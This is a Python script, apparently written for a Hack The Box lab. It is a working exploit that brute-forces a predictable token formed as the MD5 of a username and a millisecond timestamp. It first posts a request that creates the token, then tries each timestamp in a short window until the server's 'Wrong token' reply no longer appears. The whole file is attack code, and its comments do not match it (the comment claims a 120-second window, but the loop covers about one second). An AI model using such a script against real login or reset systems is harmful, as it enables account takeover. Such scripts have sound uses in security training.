from hashlib import md5
import requests, os, sys, getopt
from sys import exit
from time import time

url = ""
arguments_list = sys.argv[1:]
options_short = "u:"
options_long = ["--url"]

try:
        # Parsing arguments
        arguments,values = getopt.getopt(arguments_list, options_short, options_long)
        for argument, value in arguments:
                if argument in ("-u","--url"):
                        url = value
except getopt.error as error:
        print(str(error))

# to have a wide window try to bruteforce starting from 120seconds ago
now        = int(time()*1000)
start_time = now - 1000
end_time = now + 1000
fail_text  = "Wrong token"
user = "htbadmin"

# Send POST request for htbuser
print("Initialize request for htbuser")
data_htbuser = {"submit":"htbuser"}
res_htbuser = requests.post(url, data=data_htbuser)

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, end_time):
    # get token md5
    token = user + str(x)
    md5_token = md5(token.encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(token, md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
